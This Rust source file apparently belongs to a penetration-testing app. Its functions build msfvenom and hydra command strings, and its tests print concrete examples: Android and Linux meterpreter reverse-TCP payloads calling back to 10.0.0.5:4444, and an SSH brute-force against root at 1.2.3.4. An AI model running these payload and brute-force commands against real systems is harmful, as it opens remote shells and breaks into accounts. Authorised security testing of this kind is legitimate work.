fn or_placeholder(v: &str, placeholder: &str) -> String {
    if v.trim().is_empty() {
        placeholder.to_string()
    } else {
        v.to_string()
    }
}

#[uniffi::export]
pub fn msfvenom_cmd(
    payload: String,
    lhost: String,
    lport: String,
    format: Option<String>,
    out_path: String,
) -> String {
    let fmt = match format {
        Some(f) if !f.is_empty() => format!(" -f {f}"),
        _ => String::new(),
    };
    format!(
        "msfvenom -p {} LHOST={} LPORT={}{} -o {}",
        payload,
        or_placeholder(&lhost, "<LHOST>"),
        lport,
        fmt,
        out_path
    )
}

#[uniffi::export]
pub fn hydra_cmd(user: String, wordlist: String, service: String, target: String) -> String {
    format!(
        "hydra -l {} -P {} -t 4 -f {}://{}",
        or_placeholder(&user, "<user>"),
        wordlist,
        service,
        or_placeholder(&target, "<target>")
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn msfvenom_with_and_without_format() {
        assert_eq!(
            msfvenom_cmd(
                "android/meterpreter/reverse_tcp".into(),
                "10.0.0.5".into(),
                "4444".into(),
                None,
                "/root/x.apk".into()
            ),
            "msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o /root/x.apk"
        );
        assert!(msfvenom_cmd(
            "linux/x64/meterpreter/reverse_tcp".into(),
            "".into(),
            "4444".into(),
            Some("elf".into()),
            "/root/x.elf".into()
        )
        .contains("LHOST=<LHOST> LPORT=4444 -f elf"));
    }

    #[test]
    fn hydra_basic() {
        assert_eq!(
            hydra_cmd(
                "root".into(),
                "/usr/share/wl.txt".into(),
                "ssh".into(),
                "1.2.3.4".into()
            ),
            "hydra -l root -P /usr/share/wl.txt -t 4 -f ssh://1.2.3.4"
        );
    }
}
